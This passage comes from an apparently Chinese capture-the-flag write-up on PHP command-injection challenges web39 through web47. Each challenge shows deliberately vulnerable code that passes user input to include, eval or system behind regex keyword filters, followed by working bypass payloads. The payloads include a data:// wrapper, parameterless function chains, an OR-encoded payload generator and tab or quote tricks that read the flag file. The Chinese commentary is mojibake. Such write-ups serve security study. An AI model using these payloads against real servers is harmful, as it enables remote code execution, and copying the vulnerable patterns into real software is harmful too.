punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æœ‰é™åˆ¶çš„æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å°† php ä»£ç é—­åˆå³å¯</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;tac fla?.php&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web40\"><a class=\"anchor\" href=\"#web40\">#</a> web40</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\>|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æœ‰é™åˆ¶çš„ä»£ç æ‰§è¡Œï¼Œæˆ‘è¿˜åœ¨åƒè¿™å…¨éƒ½è¿‡æ»¤äº†æ€ä¹ˆè§£å†³ï¼Œåæ¥å‘ç°è¿™ä¸ªæ‹¬å·è¿‡æ»¤çš„æ˜¯ä¸­æ–‡çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ å’Œ web31 ä¸€æ ·çš„ payload</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ sessionID æ¥æ„é€ å‘½ä»¤æ‰§è¡Œ</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">sessionâ€”â€”start();system(session_id());\nID&#x3D;ls&#x2F;&#x2F;è¿™é‡Œæ‰“å¼€flagæˆ‘æ²¡æœ‰æµ‹è¯•æˆåŠŸï¼Œåº”è¯¥æ˜¯phpç‰ˆæœ¬çš„é—®é¢˜ï¼Œ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œæ‰“å¼€ flag æˆ‘æ²¡æœ‰æµ‹è¯•æˆåŠŸï¼Œåº”è¯¥æ˜¯ php ç‰ˆæœ¬çš„é—®é¢˜ï¼Œè¿™é‡Œæœ‰æŠ¥é”™æ˜¾ç¤ºå­—ç¬¦åªèƒ½æ˜¯æ•°å­—å­—æ¯åŠ ä¸‹åˆ’çº¿</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221029190103627.png\" alt=\"image-20221029190103627\" /></p>\n<h2 id=\"web41\"><a class=\"anchor\" href=\"#web41\">#</a> web41</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo(<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ |ï¼Œä¸€èˆ¬çœ‹åˆ°è¿™ç§ç‰¹åˆ«å…¨çš„è¿‡æ»¤éƒ½æ˜¯è¿‡æ»¤æ— å‚ rce, ä½¿ç”¨æˆ–è¿ç®—</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">256</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">256</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token variable\">$preg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// é¢˜ç›®çš„æ­£åˆ™</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span><span class=\"token punctuation\">,</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span><span class=\"token punctuation\">,</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token class-name\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60&quot;|&quot;%0c%13&quot;)\nc&#x3D;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%60%60%60%00%60%60%60%60%00%60%60%60&quot;|&quot;%03%01%14%20%06%0c%01%07%2e%10%08%10&quot;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134154287.png\" alt=\"image-20221030134154287\" /></p>\n<h2 id=\"web42\"><a class=\"anchor\" href=\"#web42\">#</a> web42</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å‘½ä»¤æ‰§è¡Œæ‹¼æ¥äº†ä¸€ä¸ªé‡å®šå‘ï¼Œå°†åé¢çš„éƒ¨åˆ†ç»•è¿‡å³å¯</p>\n<p>ç”¨ %0a æˆ–è€…ï¼›ã€&amp;ã€| éƒ½å¯ä»¥ç»•è¿‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030134733941.png\" alt=\"image-20221030134733941\" /></p>\n<h2 id=\"web43\"><a class=\"anchor\" href=\"#web43\">#</a> web43</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¢åŠ äº†åˆ†å·å’Œ cat çš„é™åˆ¶ï¼Œæ‰“å¼€æ–‡ä»¶çš„å‘½ä»¤é™¤å» cat è¿˜æœ‰å¾ˆå¤šï¼Œä¸Šé¢˜æåˆ°çš„åˆ†éš”ç¬¦é€‰ä¸€ä¸ªæ²¡è¿‡æ»¤çš„</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135146874.png\" alt=\"image-20221030135146874\" /></p>\n<h2 id=\"web44\"><a class=\"anchor\" href=\"#web44\">#</a> web44</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/;|cat|flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¤šäº†ä¸€ä¸ªæ­£åˆ™ flagï¼ŒåŒ¹é…ç¬¦ç»•è¿‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135449426.png\" alt=\"image-20221030135449426\" /></p>\n<h2 id=\"web45\"><a class=\"anchor\" href=\"#web45\">#</a> web45</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| /i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¢åŠ äº†ç©ºæ ¼æ›¿æ¢ç©ºæ ¼çš„æ–¹å¼å¾ˆå¤š</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;sort%09fl*||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030135834529.png\" alt=\"image-20221030135834529\" /></p>\n<h2 id=\"web46\"><a class=\"anchor\" href=\"#web46\">#</a> web46</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¢åŠ äº†æ•°å­—å’Œ $*</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;tac&lt;fl&#39;&#39;ag.php||<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030140817538.png\" alt=\"image-20221030140817538\" /></p>\n<h2 id=\"web47\"><a class=\"anchor\" href=\"#web47\">#</a> web47</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¢åŠ äº†å‡ ä¸ªæ‰“å¼€æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å®Œå…¨è¿‡æ»¤ï¼Œtac å’Œ nl éƒ½å¯ä»¥ç”¨</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030141214369.png\" alt=\"image-20221030141214369\" /></p>\n<h2 id=\"web52\"><a class=\"anchor\" href=\"#web52\">#</a> web52</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span 